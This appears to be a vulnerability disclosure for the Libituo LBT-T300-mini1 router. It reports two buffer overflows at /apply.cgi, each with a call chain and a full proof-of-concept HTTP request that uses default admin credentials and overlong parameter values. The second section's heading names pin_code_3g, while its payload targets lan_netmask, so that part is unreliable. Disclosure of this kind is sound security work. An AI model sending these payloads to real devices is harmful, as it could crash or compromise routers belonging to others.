# LBT-T300-mini1 Buffer Overflow
**Vulnerability description**
Shenzhen Libituo Technology Co., Ltd LBT-T300-mini1 v1.2.9 was discovered to contain two buffer overflows via multiple  parameters at /apply.cgi.

## 1.vpn_client_ip

### Vulnerability analysis
Due to the lack of data length restrictions of the vpn_client_ip, a buffer overflow vulnerability is created.

function call chain

Main()->sub_40C564()-> start_single_service()->connect_vpn()->start_vpn_pptp()->config_vpn_pptp().
![1709876942108](C:\Users\61485\AppData\Local\Temp\1709876942108.png)

![1709877188823](C:\Users\61485\AppData\Local\Temp\1709877188823.png)

![1709877238680](C:\Users\61485\AppData\Local\Temp\1709877238680.png)

![1709877253521](C:\Users\61485\AppData\Local\Temp\1709877253521.png)

![1709877273641](C:\Users\61485\AppData\Local\Temp\1709877273641.png)

![1709878128935](C:\Users\61485\AppData\Local\Temp\1709878128935.png)

![1709878161738](C:\Users\61485\AppData\Local\Temp\1709878161738.png)


> Payload

```html
POST /apply.cgi HTTP/1.1
Host: 192.168.10.1
Content-Length: 481
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YWRtaW4=
Upgrade-Insecure-Requests: 1
Origin: http://192.168.10.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.10.1/VPN_PPTP.asp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

submit_button=VPN_PPTP&change_action=&vpn_pptp_auto=0&vpn_pptp_only=0&vpn_type=&vpn_pptp_enable=0&vpn_nat_enable=1&vpn_dns_enable=1&action=Apply&vpn_pptp_server=&vpn_pptp_username=aaaaa&vpn_pptp_passwd=&vpnc_auth=0&vpn_pptp_mppe=0&vpnc_stateful=0&vpn_pptp_mtu=1450&vpn_pptp_mru=1450&vpn_client_ip=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&vpn_pptp_redial_count=5&vpn_pptp_redial_intervals=10&vpn_dst_enable=0&vpn_check_mode=1&vpn_check_interval=10&vpn_check_number=5&web_vpn_nat_enable=on&web_vpn_dns_enable=on

```

## 2.pin_code_3g
### Vulnerability analysis
Due to the lack of data length restrictions of the pin_code_3g parameter, a buffer overflow vulnerability is created.

function call chain

Main()->start3g_main()->config_3g_para.
![1709878405302](C:\Users\61485\AppData\Local\Temp\1709878405302.png)

![1709878464089](C:\Users\61485\AppData\Local\Temp\1709878464089.png)

![1709878486256](C:\Users\61485\AppData\Local\Temp\1709878486256.png)

![1709878543799](C:\Users\61485\AppData\Local\Temp\1709878543799.png)


> Payload

```html
POST /apply.cgi HTTP/1.1
Host: 192.168.10.1
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YWRtaW4=
Upgrade-Insecure-Requests: 1
Origin: http://192.168.10.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.61
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.10.1/LAN_DHCPS_AP.asp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

submit_button=LAN_DHCPS_AP&change_action=&action=Apply&lan_ipaddr=192.168.10.0&LAN_DHCPS_AP=NONE&dhcp_server_enable=1&lan_netmask=255.255.255.0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&dhcp_start=192.168.10.1&dhcp_end=192.168.10.115&dhcp_lease=999

```
